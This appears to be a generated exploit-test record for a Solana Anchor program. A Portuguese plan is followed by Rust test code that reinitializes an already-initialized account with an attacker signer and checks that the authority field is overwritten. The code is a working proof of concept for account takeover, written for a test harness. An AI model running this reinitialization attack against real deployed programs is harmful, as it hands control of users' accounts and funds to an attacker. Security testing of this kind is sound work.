{"plan": "O programa `initialize` recebe uma conta `user` como AccountInfo (sem constraint de init) e um `authority` signer. O codigo le a conta, exige que `discriminator` seja `true` (senao retorna erro) e entao sobrescreve `authority` com a chave do signer. Para montar o cenario, criamos uma conta `user` com dados ja serializados (discriminator=true, authority=chave_legitima) e chamamos `initialize` com um authority legitimo como baseline, que deve ter sucesso. Em seguida, o ataque chama `initialize` novamente sobre a mesma conta `user` (ja inicializada) com um authority atacante diferente, tentando sobrescrever o campo `authority`. O efeito medido e que o campo `authority` na conta `user` apos o ataque e igual a chave do atacante, diferente da chave legitima original, demonstrando a reinitializacao e tomada de controle.", "scenario": "let program_id = env.program_id;

// Chaves
let legit_authority = Pubkey::new_unique();
let attacker_authority = Pubkey::new_unique();
let user_key = Pubkey::new_unique();

// Conta user ja inicializada: discriminator=true, authority=legit_authority
let user_data = anchor_account_data("User", &(true, legit_authority));
let user_account = account(&program_id, &user_data, None);

// Contas para o baseline (uso legitimo)
let contas_baseline = vec![
    (user_key, user_account.clone()),
    (legit_authority, wallet(1_000_000_000)),
];

// Instrucao initialize: sem argumentos, metas: user (nao signer, writable), authority (signer)
let ix_baseline = env.anchor_ix(
    "initialize",
    &(),
    vec![
        AccountMeta::new(user_key, false),
        AccountMeta::new_readonly(legit_authority, true),
    ],
);

let r_baseline = env.baseline("initialize legitimo", &ix_baseline, &contas_baseline);

// Apos o baseline, a conta user deve ter authority=legit_authority
// Usamos o estado resultante para o ataque
let user_after_baseline = after(&r_baseline, &user_key).clone();

// Ataque: mesma instrucao initialize, mas com attacker_authority como signer
let contas_attack = vec![
    (user_key, user_after_baseline),
    (attacker_authority, wallet(1_000_000_000)),
];

let ix_attack = env.anchor_ix(
    "initialize",
    &(),
    vec![
        AccountMeta::new(user_key, false),
        AccountMeta::new_readonly(attacker_authority, true),
    ],
);

let r_attack = env.attack("reinitialize com authority atacante", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let user_data_after = after(&r_attack, &user_key).data();
    // Layout: discriminator (bool, 1 byte) + authority (Pubkey, 32 bytes)
    // authority comeca no offset 1
    let authority_after = read_pubkey(user_data_after, 1);
    env.effect(
        "authority sobrescrita pelo atacante",
        authority_after == attacker_authority,
    );
    env.effect(
        "authority diferente da legitima",
        authority_after != legit_authority,
    );
}"}

